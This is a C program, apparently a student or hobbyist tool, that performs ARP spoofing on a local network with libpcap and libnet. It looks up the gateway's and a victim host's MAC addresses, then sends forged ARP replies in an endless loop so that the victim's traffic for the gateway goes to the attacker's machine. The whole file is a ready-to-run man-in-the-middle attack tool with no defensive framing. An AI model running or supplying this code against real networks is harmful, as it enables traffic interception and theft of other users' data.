#include <stdio.h> 
#include <stdlib.h> 
#include <string.h> 
#include <libnet.h> 
#include <pcap.h> 
#include <netinet/in.h> 
#include <netinet/ether.h> 
#include <unistd.h>      
#include <arpa/inet.h> 
#include <time.h>
 
void get_mine(const char *dev, struct in_addr *my_IP, struct ether_addr *my_MAC) 
{ 
    FILE* ptr; 
    char cmd[300]={0x0}; 
    char MAC[20] = {0x0};  
    char IP[20] = {0x0}; 
         
    sprintf(cmd,"ifconfig | grep HWaddr | grep %s | awk '{print $5}'",dev);  
    ptr = popen(cmd, "r"); 
    fgets(MAC, sizeof(MAC), ptr); 
    pclose(ptr); 
 
    ether_aton_r(MAC, my_MAC);  
 
    sprintf(cmd,"ifconfig | grep -A 1 %s | tail -n 1 | awk '{print $2}' | awk -F':' '{print $2}'",dev);  
    ptr = popen(cmd, "r");  
    fgets(IP, sizeof(IP), ptr); 
    pclose(ptr); 
 
    inet_aton(IP, my_IP);  
 
    return; 
} 
 
void get_gatewayIP(const char *dev, struct in_addr *gateway_IP) 
{ 
    FILE* ptr; 
    char cmd[300] = {0x0}; 
    char IP[20] = {0x0}; 
 
    sprintf(cmd,"route -n | grep %s | grep UG | awk '{print $2}'", dev); 
    ptr = popen(cmd, "r"); 
    fgets(IP, sizeof(IP), ptr); 
    pclose(ptr); 
 
    inet_aton(IP, gateway_IP); 
 
    return; 
} 
 
 
void sendarp(pcap_t *pcd, const struct in_addr *victim_IP, struct ether_addr *victim_MAC) 
{ 
    char *dev; 
    char errbuf[PCAP_ERRBUF_SIZE];     
    const u_char *packet; 
    struct pcap_pkthdr *header; 
    struct libnet_ethernet_hdr etherhdr; 
    struct ether_arp arphdr; 
    struct libnet_ethernet_hdr *ethhdr_reply; 
    struct ether_arp *arphdr_reply; 
 
    struct in_addr my_IP; 
    struct ether_addr my_MAC;     
    struct ether_addr ether_victim_MAC; 
    struct ether_addr arp_victim_MAC; 
    int i, res; 
    int check=0;    
    time_t begin,finish;
  

    const int etherhdr_size = sizeof(struct libnet_ethernet_hdr); 
    const int arphdr_size = sizeof(struct ether_arp); 
    u_char buffer[etherhdr_size + arphdr_size];  
 
    dev = pcap_lookupdev(errbuf);  
    if(dev == NULL) 
    { 
        printf("%s\n",errbuf); 
        exit(1); 
    } 
     
    get_mine(dev, &my_IP, &my_MAC); 
     
    for(i=0; i<6; i++) 
    { 
        ether_victim_MAC.ether_addr_octet[i] = 0xff; 
        arp_victim_MAC.ether_addr_octet[i] = 0x0; 
    } 
 
    memcpy(etherhdr.ether_shost, &my_MAC.ether_addr_octet, ETHER_ADDR_LEN); 
    memcpy(etherhdr.ether_dhost, &ether_victim_MAC.ether_addr_octet, ETHER_ADDR_LEN); 
    etherhdr.ether_type = htons(ETHERTYPE_ARP); // reverse ntohs 
     
    arphdr.arp_hrd = htons(ARPHRD_ETHER);  
    arphdr.arp_pro = htons(ETHERTYPE_IP); // format of protocol address 
    arphdr.arp_hln = ETHER_ADDR_LEN; // length of hardware address 
    arphdr.arp_pln = sizeof(in_addr_t); // length of protocol addres 
    arphdr.arp_op  = htons(ARPOP_REQUEST); // operation type 
    memcpy(&arphdr.arp_sha, &my_MAC.ether_addr_octet, ETHER_ADDR_LEN); 
    memcpy(&arphdr.arp_spa, &my_IP.s_addr, sizeof(in_addr_t)); 
    memcpy(&arphdr.arp_tha, &arp_victim_MAC.ether_addr_octet, ETHER_ADDR_LEN); 
    memcpy(&arphdr.arp_tpa, &(victim_IP->s_addr), sizeof(in_addr_t));  
 
    memcpy(buffer, &etherhdr, etherhdr_size ); 
    memcpy(buffer + etherhdr_size, &arphdr, arphdr_size); 
    
    while(check != 1) 
    {
    	begin=time(NULL);
        pcap_sendpacket(pcd,buffer,sizeof(buffer));
    	while(1)
	{
    		res = pcap_next_ex(pcd, &header, &packet); 
    		finish=time(NULL);
                
		if(difftime(finish,begin) > 1)
			break; 
    		if((res==0) || (res==-1)) continue; 
     
    		ethhdr_reply = (struct libnet_ethernet_hdr *) packet;
 
        	packet += sizeof(struct libnet_ethernet_hdr);       
 
    		if(ntohs(ethhdr_reply->ether_type) == ETHERTYPE_ARP) 
    		{
        		arphdr_reply = (struct ether_arp *)packet; 
        		if(arphdr_reply->arp_op == htons(ARPOP_REPLY)) 
        		{ 
            			if(!memcmp(&arphdr_reply->arp_spa, victim_IP, 4) && !memcmp(&arphdr_reply->arp_tpa, &my_IP ,4)) 
            			{     
                			memcpy(victim_MAC,&arphdr_reply->arp_sha,6); 
                			printf("get target's MAC !! \n"); 
               			        printf("target's MAC iS : %s\n\n",(char*)ether_ntoa(arphdr_reply->arp_sha)); 
					check=1;                
					break;     
            			} 
        		} 
    		}
   	} 
  } 
} 
 
 
void ARP_Spoofing(pcap_t *pcd, const struct in_addr *gateway_IP, const struct ether_addr *my_MAC, const struct in_addr *victim_IP, const struct ether_addr *victim_MAC) 
{ 
    const int etherhdr_size = sizeof(struct libnet_ethernet_hdr); 
    const int arphdr_size = sizeof(struct ether_arp); 
    u_char buffer[etherhdr_size + arphdr_size];  
    struct libnet_ethernet_hdr etherhdr; 
    struct ether_arp arphdr; 
 
    memcpy(etherhdr.ether_shost, &my_MAC->ether_addr_octet, ETHER_ADDR_LEN);  
    memcpy(etherhdr.ether_dhost, &victim_MAC->ether_addr_octet, ETHER_ADDR_LEN); 
    etherhdr.ether_type = htons(ETHERTYPE_ARP); 
     
    arphdr.arp_hrd = htons(ARPHRD_ETHER);  
    arphdr.arp_pro = htons(ETHERTYPE_IP);  
    arphdr.arp_hln = ETHER_ADDR_LEN; 
    arphdr.arp_pln = sizeof(in_addr_t);  
    arphdr.arp_op  = htons(ARPOP_REPLY);  
    memcpy(&arphdr.arp_sha, &my_MAC->ether_addr_octet, ETHER_ADDR_LEN); 
    memcpy(&arphdr.arp_spa, &gateway_IP->s_addr, sizeof(in_addr_t)); 
    memcpy(&arphdr.arp_tha, &victim_MAC->ether_addr_octet, ETHER_ADDR_LEN); 
    memcpy(&arphdr.arp_tpa, &victim_IP->s_addr, sizeof(in_addr_t)); 
 
    memcpy(buffer, &etherhdr, etherhdr_size ); 
    memcpy(buffer + etherhdr_size, &arphdr, arphdr_size); 
     
    printf("ARP Spoofing start.. \n\n");  
     
    while(1) 
    { 
        if(pcap_sendpacket(pcd,buffer,sizeof(buffer)) == -1)  
        { 
            pcap_perror(pcd,0); 
            pcap_close(pcd); 
            exit(1); 
        } 
        sleep(1); 
    } 
 
    return; 
} 
 
 
int main(int argc, char **argv) 
{ 
    char *dev; 
    char errbuf[PCAP_ERRBUF_SIZE]; 
    pcap_t *pcd; 
 
    struct in_addr my_IP; 
    struct in_addr victim_IP;  
    struct in_addr gateway_IP; 
    struct ether_addr my_MAC; 
    struct ether_addr gateway_MAC={0x0}; 
    struct ether_addr victim_MAC={0x0};   
 
    dev = pcap_lookupdev(errbuf);  
 
    if(dev == NULL) 
    { 
        printf("%s\n",errbuf); 
        exit(1); 
    } 
     
    pcd = pcap_open_live(dev, BUFSIZ,  1/*PROMISCUOUS*/, -1, errbuf); // PROMISCUOUS means, pcd captures all packets of local network. 
 
    if (pcd == NULL) 
    { 
        printf("%s\n", errbuf); 
        exit(1); 
    } 
     
    if(inet_aton(argv[1], &victim_IP)==0) 
    { 
        printf("error : %s \n", argv[1]); 
        exit(1); 
    } 
     
    get_mine(dev, &my_IP, &my_MAC); 
    get_gatewayIP(dev, &gateway_IP); 

    printf("get gateway's MAC starts~ \n");     
    sendarp(pcd, &gateway_IP, &gateway_MAC); 
 
    printf("get victim's MAC starts~ \n"); 
    sendarp(pcd, &victim_IP, &victim_MAC); 
     
    ARP_Spoofing(pcd, &gateway_IP, &my_MAC, &victim_IP, &victim_MAC); 
     
    return 0; 
}
